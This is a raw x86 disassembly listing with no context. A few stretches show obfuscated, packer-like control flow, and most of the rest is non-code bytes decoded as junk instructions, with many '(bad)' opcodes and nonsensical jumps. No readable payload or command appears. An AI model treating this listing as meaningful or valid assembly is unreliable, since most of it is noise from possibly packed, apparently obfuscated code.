  40a3e2:	gs test dh,bh
  40a3e5:	mov    BYTE PTR [ecx-0x64],dl
  40a3e8:	bnd jg 0x40a3a0
  40a3eb:	not    DWORD PTR [ecx]
  40a3ed:	jae    0x40a399
  40a3ef:	(bad)  
  40a3f0:	sub    al,0xcf
  40a3f2:	jae    0x40a3d3
  40a3f4:	sub    DWORD PTR [edi],edi
  40a3f6:	adc    DWORD PTR [ebx-0x4a],edi
  40a3f9:	shl    DWORD PTR [esp+edx*2-0x287cb9c3],cl
  40a400:	push   eax
  40a401:	rcl    DWORD PTR [ebp-0x2c],0xc3
  40a405:	sub    BYTE PTR [ebp-0x20bc14cc],dl
  40a40b:	xor    dh,BYTE PTR [esi]
  40a40d:	mov    edx,DWORD PTR [ebp-0x4]
  40a410:	xor    edx,eax
  40a412:	adc    DWORD PTR ds:0x4335f3,0x43361f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43362b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433563
  40a440:	and    DWORD PTR ds:0x43365f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433657
  40a44f:	sbb    DWORD PTR ds:0x433567,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4335f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4335a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4335a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4335a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4335a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4335a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43366f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    ecx,DWORD PTR [edx]
  40a4c2:	dec    ebx
  40a4c3:	cmp    BYTE PTR [edi],dh
  40a4c5:	mov    edi,esi
  40a4c7:	jl     0x40a545
  40a4c9:	retf   0x7c79
  40a4cc:	jl     0x40a4d6
  40a4ce:	stc    
  40a4cf:	je     0x40a4e4
  40a4d1:	mov    bh,0x36
  40a4d3:	ss imul bl
  40a4d6:	jmp    0x40a485
  40a4d8:	adc    edx,DWORD PTR [edx]
  40a4da:	xchg   edi,eax
  40a4db:	popa   
  40a4dc:	(bad)  
  40a4dd:	aad    0x16
  40a4df:	jae    0x40a503
  40a4e1:	jg     0x40a502
  40a4e3:	mov    eax,0x857eb9ae
  40a4e8:	std    
  40a4e9:	mov    esi,0x63030aaa
  40a4ee:	or     ecx,DWORD PTR [edi-0x7f8742c4]
  40a4f4:	das    
  40a4f5:	mov    cr3,ebx
  40a4f8:	cwde   
  40a4f9:	sub    al,0xc5
  40a4fb:	(bad)  
  40a4fc:	pop    edx
  40a4fd:	push   cs
  40a4fe:	js     0x40a49c
  40a500:	fdiv   st(7),st
  40a502:	pop    ebp
  40a503:	inc    eax
  40a504:	mov    eax,0xc3654e12
  40a509:	cmp    al,0x7e
  40a50b:	pop    ebp
  40a50c:	stos   BYTE PTR es:[edi],al
  40a50d:	inc    edx
  40a50e:	dec    ebp
  40a50f:	js     0x40a4f6
  40a511:	lock and DWORD PTR [edi-0x74],0xffffffac
  40a516:	push   esp
  40a517:	pop    es
  40a518:	sbb    DWORD PTR [eax],edi
  40a51a:	inc    ecx
  40a51b:	sbb    ah,BYTE PTR [edx+ebx*1-0x5842d614]
  40a522:	pushf  
  40a523:	adc    eax,0xc7f0ccbc
  40a528:	push   0xffffffb0
  40a52a:	dec    eax
  40a52b:	mov    ebp,0x8fc60c35
  40a530:	jns    0x40a4f7
  40a532:	jge    0x40a4b7
  40a534:	xor    al,0x6e
  40a536:	(bad)  
  40a537:	add    eax,0x4999e473
  40a53c:	mov    ds,WORD PTR [edi+0xdb3949c]
  40a542:	mov    ?,WORD PTR [edi-0x47b280a5]
  40a548:	mov    ds:0xff49c008,eax
  40a54d:	mov    ds:0x88985927,al
  40a552:	adc    dh,BYTE PTR [edx-0x45]
  40a555:	jmp    0x725:0x8a3ade92
  40a55c:	ret    
  40a55d:	dec    ebp
  40a55e:	jl     0x40a4f1
  40a560:	cmp    DWORD PTR [edi],ebp
  40a562:	ret    
  40a563:	jae    0x40a552
  40a565:	mov    ds:0xf9bd6d28,al
  40a56a:	add    DWORD PTR [ebx-0x33a97a08],ecx
  40a570:	xchg   BYTE PTR [edx-0x2d],cl
  40a573:	sbb    al,0xa8
  40a575:	or     ecx,ebx
  40a577:	push   edx
  40a578:	fucomi st,st(2)
  40a57a:	out    dx,al
  40a57b:	sbb    esp,DWORD PTR [esi+0x8]
  40a57e:	xchg   esp,eax
  40a57f:	xchg   edi,eax
  40a580:	or     BYTE PTR [edx],al
  40a582:	sbb    cl,BYTE PTR [ebx+0x70]
  40a585:	mov    esi,0x2c95647
  40a58a:	daa    
  40a58b:	(bad)  
  40a58c:	out    0xdb,eax
  40a58e:	xor    BYTE PTR [ebp-0x5f],bh
  40a591:	mov    ch,0x3
  40a593:	push   0x67ac43bf
  40a598:	int    0x8d
  40a59a:	mov    edi,0xa2be4527
  40a59f:	mov    edi,0xf96b3eb
  40a5a4:	jge    0x40a5b3
  40a5a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a7:	push   ebx
  40a5a8:	cmp    edi,0xffffffc8
  40a5ab:	aad    0x7d
  40a5ad:	jnp    0x40a561
  40a5af:	mov    bh,0x7d
  40a5b1:	push   ecx
  40a5b2:	lds    edi,FWORD PTR [ebp-0x703f5389]
  40a5b8:	fisttp DWORD PTR [ecx-0x5f5f5fbc]
  40a5be:	sub    ebx,DWORD PTR [ebp-0x24]
  40a5c1:	(bad)  
  40a5c2:	outs   dx,DWORD PTR ds:[esi]
  40a5c3:	push   0x15
  40a5c5:	or     BYTE PTR [ecx-0xf],ch
  40a5c8:	aaa    
  40a5c9:	mov    ecx,0x575a6a8f
  40a5ce:	xchg   edi,eax
  40a5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d0:	sub    al,0xde
  40a5d2:	inc    edx
  40a5d3:	jae    0x40a5c4
  40a5d5:	xchg   ebx,eax
  40a5d6:	jae    0x40a62c
  40a5d8:	pop    edx
  40a5d9:	call   0x5d4fa03c
  40a5de:	aas    
  40a5df:	mov    dl,0x60
  40a5e1:	out    0x6f,eax
  40a5e3:	loopne 0x40a588
  40a5e5:	push   ecx
  40a5e6:	aad    0x31
  40a5e8:	fbld   TBYTE PTR [edx+0x3]
  40a5eb:	dec    ebx
  40a5ec:	in     eax,0xab
  40a5ee:	xor    ecx,DWORD PTR [ebp-0xe825c55]
  40a5f4:	or     dl,BYTE PTR [edx]
  40a5f6:	scas   al,BYTE PTR es:[edi]
  40a5f7:	push   ds
  40a5f8:	ja     0x40a654
  40a5fa:	push   esi
  40a5fb:	retf   
  40a5fc:	jnp    0x40a580
  40a5fe:	push   esi
  40a5ff:	or     DWORD PTR [edx+0x3cbd9513],esp
  40a605:	dec    eax
  40a606:	sub    bl,dl
  40a608:	inc    ebp
  40a609:	sbb    ah,BYTE PTR [ebp-0x5060f0bb]
  40a60f:	xchg   ebx,eax
  40a610:	push   0xfc5310ff
  40a615:	mov    ds:0x67b1fbf2,eax
  40a61a:	xlat   BYTE PTR ds:[ebx]
  40a61b:	ss jae 0x40a5b5
  40a61e:	sub    DWORD PTR [ebx-0x347f9489],0xa5b5e236
  40a628:	and    BYTE PTR [edx],dh
  40a62a:	sbb    ebp,eax
  40a62c:	shl    DWORD PTR [ebx+0x71e2fbcc],cl
  40a632:	jmp    0x40a5b4
  40a634:	and    edi,esi
  40a636:	arpl   WORD PTR [edx+0x27],cx
  40a639:	adc    eax,0xc2cd031
  40a63e:	cdq    
  40a63f:	or     BYTE PTR [ecx],ch
  40a641:	mov    esp,ebx
  40a643:	(bad)  
  40a644:	fs mov bh,0x7b
  40a647:	leave  
  40a648:	test   eax,0x70870988
  40a64d:	add    esi,ebx
  40a64f:	mov    ?,WORD PTR [edx-0x53]
  40a652:	jecxz  0x40a672
  40a654:	sbb    ch,BYTE PTR [edi+0x20]
  40a657:	into   
  40a658:	adc    DWORD PTR [ecx-0x5f807a06],ebp
  40a65e:	sub    DWORD PTR [eax-0x3c735179],esp
  40a664:	stc    
  40a665:	dec    edx
  40a666:	mov    ebp,0x3fae4456
  40a66b:	inc    esi
  40a66c:	xchg   esi,eax
  40a66d:	cmp    ebp,DWORD PTR [ebx-0x1d]
  40a670:	mov    WORD PTR [ebx-0x2a3c9f3b],ss
  40a676:	mov    al,ds:0xef73e13f
  40a67b:	mov    bl,0x11
  40a67d:	add    edi,DWORD PTR [edx+0x39]
  40a680:	and    cl,BYTE PTR [ecx-0x6c829a08]
  40a686:	sub    dh,bh
  40a688:	inc    edi
  40a689:	jle    0x40a661
  40a68b:	into   
  40a68c:	fild   DWORD PTR [edi]
  40a68e:	push   0x3851b2e7
  40a693:	mov    bl,0xe4
  40a695:	cmp    DWORD PTR es:[esp+ecx*4],ecx
  40a699:	mulps  xmm4,XMMWORD PTR [edx-0x24]
  40a69d:	mov    ebp,0x3e6d6f9a
  40a6a2:	add    bh,BYTE PTR [edx-0x475dffe8]
  40a6a8:	xlat   BYTE PTR ds:[ebx]
  40a6a9:	fadd   st(5),st
  40a6ab:	inc    ecx
  40a6ac:	mov    esi,0xe213476d
  40a6b1:	jle    0x40a67b
  40a6b3:	jg     0x40a719
  40a6b5:	loopne 0x40a72f
  40a6b7:	or     BYTE PTR [ebx],0xee
  40a6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6bb:	adc    BYTE PTR [ebx-0x53],ah
  40a6be:	xor    eax,0x5067dc13
  40a6c3:	push   edx
  40a6c4:	sar    cl,1
  40a6c6:	or     eax,0xc42748e8
  40a6cb:	add    al,0x59
  40a6cd:	hlt    
  40a6ce:	xchg   edx,ebp
  40a6d0:	lock fist WORD PTR [esi]
  40a6d3:	pushf  
  40a6d4:	sub    bl,bl
  40a6d6:	and    al,0xa7
  40a6d8:	and    ebp,DWORD PTR es:[edx]
  40a6db:	out    dx,eax
  40a6dc:	fs ds dec ebx
  40a6df:	loop   0x40a695
  40a6e1:	mov    al,BYTE PTR [esi+0x6e]
  40a6e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6e5:	es hlt 
  40a6e7:	std    
  40a6e8:	inc    edi
  40a6e9:	ret    0xbbf1
  40a6ec:	xchg   ebp,eax
  40a6ed:	pop    eax
  40a6ee:	cmc    
  40a6ef:	dec    esp
  40a6f0:	pop    ds
  40a6f1:	out    dx,eax
  40a6f2:	lock mov eax,0x5f79fd58
  40a6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6f9:	or     esp,DWORD PTR [eax-0xd2acc8c]
  40a6ff:	(bad)  
  40a700:	mov    ds:0x9fd25056,eax
  40a705:	add    bh,bh
  40a707:	and    ch,BYTE PTR [edx-0x66]
  40a70a:	push   esi
  40a70b:	xchg   esi,eax
  40a70c:	ins    BYTE PTR es:[edi],dx
  40a70d:	sub    ebx,DWORD PTR [eax-0x144feb5d]
  40a713:	pop    ss
  40a714:	mov    al,ds:0xf2aa267d
  40a719:	dec    esp
  40a71a:	inc    ecx
  40a71b:	shl    dh,1
  40a71d:	xlat   BYTE PTR ds:[ebx]
  40a71e:	leave  
  40a71f:	sbb    BYTE PTR [ebp+0x1],bh
  40a722:	lods   al,BYTE PTR ds:[esi]
  40a723:	out    dx,eax
  40a724:	pop    ecx
  40a725:	(bad)  
  40a726:	mov    ebx,0x6fb24280
  40a72b:	xchg   edx,eax
  40a72c:	inc    ecx
  40a72d:	cmp    BYTE PTR [edi+0x37485054],ch
  40a733:	cdq    
  40a734:	mov    ah,BYTE PTR [edx+eax*2-0x6]
  40a738:	adc    al,0xf4
  40a73a:	dec    esi
  40a73b:	and    esp,edx
  40a73d:	cmc    
  40a73e:	xchg   ebx,eax
  40a73f:	hlt    
  40a740:	in     eax,0x86
  40a742:	jge    0x40a6cc
  40a744:	and    ah,bl
  40a746:	(bad)  
  40a748:	test   ebx,edx
  40a74a:	xor    eax,0x7fee2024
  40a74f:	ret    0xa71
  40a752:	xor    al,0x48
  40a754:	stc    
  40a755:	xchg   ebp,eax
  40a756:	mov    dh,0x1d
  40a758:	jae    0x40a721
  40a75a:	pop    ebx
  40a75b:	ins    BYTE PTR es:[edi],dx
  40a75c:	into   
  40a75d:	imul   edx,DWORD PTR [ebx],0xffffffb1
  40a760:	std    
  40a761:	sbb    edi,DWORD PTR [edx+edi*8]
  40a764:	add    eax,0x652420de
  40a769:	lock adc esp,0x2f
  40a76d:	pushf  
  40a76e:	push   ebx
  40a76f:	or     al,0xe7
  40a771:	sub    eax,0x9e128cc
  40a776:	jmp    0x943d:0xe6ed9f8b
  40a77d:	and    dl,BYTE PTR [eax+0x2698873a]
  40a783:	popf   
  40a784:	xor    al,0x1f
  40a786:	xlat   BYTE PTR ds:[ebx]
  40a787:	push   ebp
  40a788:	or     eax,0xea5962c1
  40a78d:	lea    eax,[edi]
  40a78f:	daa    
  40a790:	mov    ecx,0xe9abdb76
  40a795:	loope  0x40a750
  40a797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a798:	cld    
  40a799:	ret    0x6cab
  40a79c:	int    0xb5
  40a79e:	repz rol BYTE PTR [esi+0x73],0x9a
  40a7a3:	sub    edi,edi
  40a7a5:	ret    0x8f4a
  40a7a8:	lods   al,BYTE PTR ds:[esi]
  40a7a9:	sbb    DWORD PTR [eax+0x10],ecx
  40a7ac:	mov    edi,0x35e64ab0
  40a7b1:	dec    BYTE PTR [ecx+0x44]
  40a7b4:	pop    edx
  40a7b5:	add    BYTE PTR [eax],al
  40a7b7:	cmc    
  40a7b8:	push   esi
  40a7b9:	mov    edi,0xd6cb5eb
  40a7be:	sbb    BYTE PTR [edx+0x29],dl
  40a7c1:	push   ecx
  40a7c2:	lods   al,BYTE PTR ds:[esi]
  40a7c3:	adc    BYTE PTR [eax+0x25],dl
  40a7c6:	ja     0x40a758
  40a7c8:	popf   
  40a7c9:	xchg   ecx,eax
  40a7ca:	mov    edx,0x2dd03fef
  40a7cf:	push   ebp
  40a7d0:	repz (bad) 
  40a7d2:	cmp    eax,0x7176142c
  40a7d7:	ins    DWORD PTR es:[edi],dx
  40a7d8:	mov    edi,0x72cd3a62
  40a7dd:	and    dh,al
  40a7df:	test   eax,0xd35c5935
  40a7e4:	adc    eax,0x9eb61dd6
  40a7e9:	xor    al,0xf7
  40a7eb:	sti    
  40a7ec:	(bad)  
  40a7ed:	fst    QWORD PTR [edx]
  40a7ef:	push   0x52852f16
  40a7f4:	fdivr  QWORD PTR [eax]
  40a7f6:	pop    esp
  40a7f7:	cmp    DWORD PTR [ebp-0xde79a23],ebx
  40a7fd:	inc    edx
  40a7fe:	jecxz  0x40a7f9
  40a800:	mov    bl,BYTE PTR [edi+0x33]
  40a803:	mov    dh,0xde
  40a805:	test   DWORD PTR [edi-0x50218645],esi
  40a80b:	jb     0x40a804
  40a80d:	into   
  40a80e:	out    0x6b,eax
  40a810:	and    al,0xdb
  40a812:	call   0x1aaf:0xbd45b098
  40a819:	mov    ds:0x1a50a4d9,eax
  40a81e:	mov    ecx,DWORD PTR [edi]
  40a820:	xor    eax,0xaf0fd9c8
  40a825:	xlat   BYTE PTR ds:[ebx]
  40a826:	adc    DWORD PTR ds:0x4335af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4335ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4335ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433597
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4335df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4335af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433623
  40a878:	sub    ebx,DWORD PTR ds:0x43354f
  40a87e:	mov    DWORD PTR ds:0x433623,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433597,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433617
  40a89b:	adc    DWORD PTR ds:0x433553,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4335a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	mov    bh,ah
  40a8e3:	push   eax
  40a8e4:	xor    DWORD PTR [edi-0x10],esp
  40a8e7:	jl     0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a8dd
  40a8ee:	test   eax,0x37d7cd3c
  40a8f3:	pop    edx
  40a8f4:	daa    
  40a8f5:	mov    esp,0x69a58030
  40a8fa:	mov    ds,WORD PTR [edx+0x50de68d0]
  40a900:	mov    eax,0xd3f325d7
  40a905:	out    dx,eax
  40a906:	aad    0xea
  40a908:	and    al,0xac
  40a90a:	retf   0xc422
  40a90d:	(bad)  
  40a90e:	loope  0x40a923
  40a910:	rol    bh,cl
  40a912:	test   dh,al
  40a914:	aaa    
  40a915:	cs leave 
  40a917:	lods   eax,DWORD PTR ds:[esi]
  40a918:	stos   BYTE PTR es:[edi],al
  40a919:	push   ebp
  40a91a:	data16 js 0x40a89f
  40a91d:	mov    ebp,0x2b00811
  40a922:	xchg   ebp,eax
  40a923:	push   esi
  40a924:	mov    bh,0x75
  40a926:	popa   
  40a927:	rcr    DWORD PTR [eax+ebx*4-0x79],0xf5
  40a92c:	arpl   WORD PTR [ebx-0x518a4713],bp
  40a932:	and    cl,bl
  40a934:	pop    eax
  40a935:	fwait
  40a936:	dec    esp
  40a937:	jmp    0x40a8ba
  40a939:	adc    esp,DWORD PTR [edi+0x51eb55d8]
  40a93f:	sbb    al,0xb7
  40a941:	fs int 0xd3
  40a944:	jge    0x40a9c4
  40a946:	rcr    BYTE PTR [edx],1
  40a948:	inc    edx
  40a949:	imul   esp,DWORD PTR [edx],0x6b18a483
  40a94f:	ror    BYTE PTR [ebp+0x7f],0xbc
  40a953:	xor    BYTE PTR [ebx+0x2c6ac8bd],0x5e
  40a95a:	sbb    BYTE PTR [ebp+edx*2-0x31],0xd7
  40a95f:	mov    ds:0x2e54f476,al
  40a964:	push   0x16
  40a966:	(bad)  
  40a967:	mov    dl,0x4e
  40a969:	and    al,0xb
  40a96b:	(bad)
  40a96f:	mov    eax,ds:0x6bbd85de
  40a974:	out    dx,al
  40a975:	retf   0xe323
  40a978:	jae    0x40a955
  40a97a:	lods   al,BYTE PTR ds:[esi]
  40a97b:	mov    ebx,0xf49a681d
  40a980:	mov    WORD PTR [edi],es
  40a982:	inc    eax
  40a983:	or     DWORD PTR [eax-0x2f89ec11],eax
  40a989:	(bad)  
  40a98a:	jge    0x40a97f
  40a98c:	data16 mov al,ds:0xaff3b5ac
  40a992:	or     DWORD PTR [ebx-0x44],ebx
  40a995:	mov    edi,0xa29d9119
  40a99a:	(bad)  
  40a99c:	loopne 0x40a96d
  40a99e:	adc    dl,BYTE PTR [ebx+0x48]
  40a9a1:	mov    ds:0xbc00929d,al
  40a9a6:	call   0xecdc1295
  40a9ab:	aas    
  40a9ac:	cmc    
  40a9ad:	mov    esi,0x7ac8ede2
  40a9b2:	inc    esp
  40a9b3:	inc    ebx
  40a9b4:	add    eax,0xba44d6dc
  40a9b9:	cmc    
  40a9ba:	adc    bl,0x41
  40a9bd:	test   dh,0xcd
  40a9c0:	sar    BYTE PTR [ebx],0x63
  40a9c3:	mov    bh,0x7a
  40a9c5:	xor    DWORD PTR [edi-0x2f27d4c6],edx
  40a9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9cc:	cli    
  40a9cd:	test   DWORD PTR [edi],0x88c2e025
  40a9d3:	xchg   esi,eax
  40a9d4:	cwde   
  40a9d5:	(bad)  
  40a9d6:	xor    DWORD PTR ds:0xbd743267,esp
  40a9dc:	jecxz  0x40a9ad
  40a9de:	in     al,0xe
  40a9e0:	adc    al,0x4
  40a9e2:	dec    eax
  40a9e3:	push   eax
  40a9e4:	jae    0x40aa60
  40a9e6:	mov    al,ds:0x7ddc70ed
  40a9eb:	and    eax,0xc5a8db8d
  40a9f0:	or     cl,BYTE PTR [ebp+0x11fc457a]
  40a9f6:	sbb    dh,BYTE PTR [ebx+0x7b39d913]
  40a9fc:	sti    
  40a9fd:	into   
  40a9fe:	in     al,0x51
  40aa00:	inc    ebp
  40aa01:	(bad)  
  40aa03:	(bad)  
  40aa04:	sar    BYTE PTR [ebp+0x5dcaa0d],1
  40aa0a:	or     eax,0x23094e74
  40aa0f:	mov    eax,ds:0xebb122d1
  40aa14:	popf   
  40aa15:	mov    dh,0x50
  40aa17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa18:	test   BYTE PTR [eax],cl
  40aa1a:	retf   0xed06
  40aa1d:	cld    
  40aa1e:	stc    
  40aa1f:	inc    ebp
  40aa20:	adc    BYTE PTR [esi],bh
  40aa22:	or     ebp,esp
  40aa24:	mov    esp,0x35cfcd32
  40aa29:	jecxz  0x40aa05
  40aa2b:	xchg   ebp,eax
  40aa2c:	jno    0x40aa1d
  40aa2e:	xchg   esp,eax
  40aa2f:	neg    esi
  40aa31:	or     ebx,esp
  40aa33:	mov    cl,0xc5
  40aa35:	ja     0x40a9c8
  40aa37:	clc    
  40aa38:	fisttp QWORD PTR [esi+0x3]
  40aa3b:	adc    DWORD PTR [esi],esi
  40aa3d:	aad    0xad
  40aa3f:	in     eax,dx
  40aa40:	test   BYTE PTR [ebp+0x25bea6ba],dl
  40aa46:	retf   
  40aa47:	arpl   WORD PTR [eax-0x72],sp
  40aa4a:	fs mov al,0x55
  40aa4d:	(bad)  
  40aa4e:	idiv   BYTE PTR [esi-0x5]
  40aa51:	xor    eax,0xa2ee7fe0
  40aa56:	cmp    al,al
  40aa58:	dec    esp
  40aa59:	in     eax,dx
  40aa5a:	sub    DWORD PTR [ebp+0x6e2af586],0xcdb92861
  40aa64:	xor    al,0x23
  40aa66:	and    bl,BYTE PTR [eax+ecx*4]
  40aa69:	add    dh,bh
  40aa6b:	pop    esi
  40aa6c:	add    bh,BYTE PTR [edx+0x2c]
  40aa6f:	push   ecx
  40aa70:	daa    
  40aa71:	retf   
  40aa72:	out    dx,eax
  40aa73:	fcompp 
  40aa75:	test   DWORD PTR [ebx+0x65],0x1ce21994
  40aa7c:	mov    ah,0xf3
  40aa7e:	inc    esi
  40aa7f:	dec    ebx
  40aa80:	cdq    
  40aa81:	inc    ecx
  40aa82:	xlat   BYTE PTR ds:[ebx]
  40aa83:	pop    ebp
  40aa84:	or     eax,0xf2b9b178
  40aa89:	lea    esi,[ebx+ebp*4-0x54]
  40aa8d:	push   edx
  40aa8e:	ins    DWORD PTR es:[edi],dx
  40aa8f:	mov    ?,WORD PTR [ecx+0x114b9671]
  40aa95:	dec    eax
  40aa96:	sub    eax,0xce77f190
  40aa9b:	rol    DWORD PTR [edx+0x137a7646],1
  40aaa1:	add    DWORD PTR [ecx-0x2ef95b5c],esi
  40aaa7:	js     0x40aa4a
  40aaa9:	loop   0x40aa50
  40aaab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaac:	xor    BYTE PTR [ecx],al
  40aaae:	fist   WORD PTR [edi+0x3]
  40aab1:	scas   al,BYTE PTR es:[edi]
  40aab2:	cs jns 0x40ab0b
  40aab5:	inc    ebp
  40aab6:	xor    BYTE PTR [eax-0x63],bl
  40aab9:	into   
  40aaba:	xlat   BYTE PTR ds:[ebx]
  40aabb:	mov    ds:0x1b8f3b88,al
  40aac0:	mov    DWORD PTR [ebx],ebp
  40aac2:	mov    ah,0x27
  40aac4:	jne    0x40aadf
  40aac6:	sbb    eax,DWORD PTR ds:0x33696cd2
  40aacc:	pusha  
  40aacd:	out    dx,al
  40aace:	imul   ch
  40aad0:	daa    
  40aad1:	mov    ds:0x396cd18a,eax
  40aad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad7:	sbb    ebp,DWORD PTR [ecx-0x1cad40c2]
  40aadd:	jbe    0x40aaeb
  40aadf:	stos   BYTE PTR es:[edi],al
  40aae0:	or     DWORD PTR [edi],0x4
  40aae3:	jbe    0x40ab00
  40aae5:	lods   eax,DWORD PTR ds:[esi]
  40aae6:	aad    0x6f
  40aae8:	inc    esi
  40aae9:	xchg   esp,eax
  40aaea:	pushf  
  40aaeb:	inc    eax
  40aaec:	out    dx,al
  40aaed:	cmc    
  40aaee:	add    ah,ah
  40aaf0:	outs   dx,DWORD PTR ds:[esi]
  40aaf1:	jecxz  0x40ab5b
  40aaf3:	popa   
  40aaf4:	(bad)  
  40aaf5:	shr    DWORD PTR [ecx-0x22],1
  40aaf8:	jmp    0xd1df1e20
  40aafd:	dec    edx
  40aafe:	xlat   BYTE PTR ds:[ebx]
  40aaff:	test   eax,0x31cf5665
  40ab04:	jo     0x40aaf3
  40ab06:	sahf   
  40ab07:	sbb    dl,BYTE PTR ds:0x48ab65f0
  40ab0d:	add    esi,DWORD PTR [ebx+0x29bd9f53]
  40ab13:	test   al,0x55
  40ab15:	shl    BYTE PTR ds:[ecx-0x426b2c4d],cl
  40ab1c:	dec    edi
  40ab1d:	jg     0x40aad2
  40ab1f:	daa    
  40ab20:	inc    ebx
  40ab21:	jae    0x40ab3b
  40ab23:	xchg   ebp,eax
  40ab24:	dec    ecx
  40ab25:	scas   eax,DWORD PTR es:[edi]
  40ab26:	ins    BYTE PTR es:[edi],dx
  40ab27:	iret   
  40ab28:	jnp    0x40aad1
  40ab2a:	or     BYTE PTR [edi],bl
  40ab2c:	jle    0x40ab75
  40ab2e:	sub    al,0x84
  40ab30:	cmp    BYTE PTR [ebx-0x14],ch
  40ab33:	clc    
  40ab34:	fimul  WORD PTR [esp+esi*1-0x4537c6e1]
  40ab3b:	call   0x190fecd1
  40ab40:	daa    
  40ab41:	shr    BYTE PTR [ecx+0x7b],cl
  40ab44:	shl    DWORD PTR [ebp+0x45],cl
  40ab47:	call   0xd2e59598
  40ab4c:	and    al,0xa1
  40ab4e:	xor    bl,BYTE PTR [ebx+0x67]
  40ab51:	dec    ecx
  40ab52:	or     BYTE PTR [edx-0x29],0x93
  40ab56:	rcl    DWORD PTR [edx],1
  40ab58:	jp     0x40ab8d
  40ab5a:	xchg   ebx,eax
  40ab5b:	push   eax
  40ab5c:	pop    edx
  40ab5d:	ror    ebp,cl
  40ab5f:	adc    eax,0x7ef51223
  40ab64:	push   es
  40ab65:	dec    esi
  40ab66:	cld    
  40ab67:	pushfw 
  40ab69:	push   0xa0a77bf5
  40ab6e:	fst    QWORD PTR [edi-0x10]
  40ab71:	sub    eax,esp
  40ab73:	in     al,0x6f
  40ab75:	mov    DWORD PTR [ebx+0x9],0xe6fd9ede
  40ab7c:	mov    cs,WORD PTR [edi]
  40ab7e:	mov    esp,0xe436c9de
  40ab83:	out    0x6c,eax
  40ab85:	sub    al,0xa0
  40ab87:	add    al,0x9f
  40ab89:	test   al,0xf4
  40ab8b:	not    DWORD PTR [ecx+0x73]
  40ab8e:	inc    ebx
  40ab8f:	and    bl,BYTE PTR [esi+0x2d250172]
  40ab95:	fimul  DWORD PTR [ebp-0x4a]
  40ab98:	sbb    eax,0xb74d1f3
  40ab9d:	xor    esp,DWORD PTR [ebp+0x462d7c26]
  40aba3:	call   0x76243233
  40aba8:	and    eax,0xedca488e
  40abad:	call   0xc538a082
  40abb2:	mov    ah,0xb7
  40abb4:	push   0x2a
  40abb6:	daa    
  40abb7:	mov    dh,0xa4
  40abb9:	call   0xb567892b
  40abbe:	adc    dl,BYTE PTR [esi-0xc]
  40abc1:	inc    eax
  40abc2:	mov    bl,0x4a
  40abc4:	dec    esi
  40abc5:	sub    BYTE PTR [edx-0x4b54ab9d],0xfb
  40abcc:	lods   eax,DWORD PTR ds:[esi]
  40abcd:	ja     0x40abd0
  40abcf:	aad    0x7e
  40abd1:	cmc    
